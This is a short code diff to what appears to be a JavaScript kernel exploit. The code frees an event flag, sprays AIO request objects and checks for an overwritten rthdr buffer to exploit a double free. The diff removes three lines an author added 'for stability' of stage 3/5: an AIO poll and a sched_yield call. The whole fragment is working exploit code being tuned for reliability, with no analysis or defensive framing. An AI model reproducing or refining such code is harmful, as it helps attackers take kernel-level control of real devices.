@@ -1807,9 +1807,6 @@ function double_free_reqs1(
   //log('start overwrite rthdr with AIO queue entry loop');
   var aio_not_found = true;
   free_evf(evf);
-  // tambahan saya untuk stabilitas stage 3/5
-  aio_multi_poll(aio_ids_p, num_elems);
-  sys_void('sched_yield');
   for (var i = 0; i < num_clobbers; i++) {
     spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);
     if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
